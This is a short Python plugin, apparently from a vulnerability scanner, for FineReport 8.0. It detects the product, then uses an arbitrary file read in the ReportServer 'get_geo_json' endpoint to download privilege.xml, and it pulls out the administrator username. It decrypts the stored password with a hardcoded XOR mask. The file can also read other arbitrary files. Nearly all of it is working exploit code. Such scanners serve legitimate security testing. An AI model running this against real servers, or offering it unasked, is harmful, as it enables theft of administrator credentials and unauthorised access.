# -*- coding:utf-8 -*-
# 帆软报表8.0 任意文件读取
import re

from .. import requestUtil
from ServiceScanModel.models import ServiceScan


def fineport_file_poc(url, filename="privilege.xml", type="poc"):
    resp = requestUtil.get(url + "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=%s" % filename)
    if type == "poc":
        info_list = (re.findall("<!\[CDATA\[(.*?)]]>", resp.text))[:2]
        return (info_list[0], decrypt(info_list[1]))
    else:
        return resp.text


def decrypt(cipher):
    PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23]  # 掩码
    password = ""
    cipher = cipher[3:]  # 截断三位后
    for i in range(int(len(cipher) / 4)):
        c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
        c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
        password = password + chr(c2)
    return password


def fingerprint(service):
    try:
        if service.url:
            resp = requestUtil.get(service.url + "/WebReport/ReportServer")
            if "部署页面" in resp.text:
                return True
    except:
        return False


def poc(service: ServiceScan):
    try:
        result = fineport_file_poc(service.url)
        if result:
            return ["帆软报表8.0 任意文件读取", "用户名: %s<br>密码: %s" % (result[0], result[1])]
    except:
        return []
